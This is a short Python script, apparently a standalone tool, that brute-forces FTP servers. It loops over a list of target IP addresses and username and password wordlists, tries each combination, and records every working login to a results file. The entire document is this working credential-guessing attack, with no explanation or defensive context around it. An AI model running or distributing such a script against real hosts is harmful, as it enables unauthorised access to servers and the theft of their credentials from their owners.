
from ftplib import FTP
import ftplib
passwords = open("ftppass.txt", "r")
usernames = open ("ftpuser.txt", "r")
results = open("results.txt", "w+")
with open("ip.txt", "r") as ips:
    for ip in ips:
        success = 0;
        usernames.seek(0)
        for username in usernames:
            if success == 1:
                break
            passwords.seek(0)
            for password in passwords:
                try:
                    ftp = FTP(ip.strip())
                    ftp.login(username.strip(), password.strip())
                    results.write(ip.strip() + " " + username.strip() + " " + password.strip() + "\n")
                    success = 1
                    ftp.close()
                    break
                except ftplib.error_perm:
                    ftp.close()
















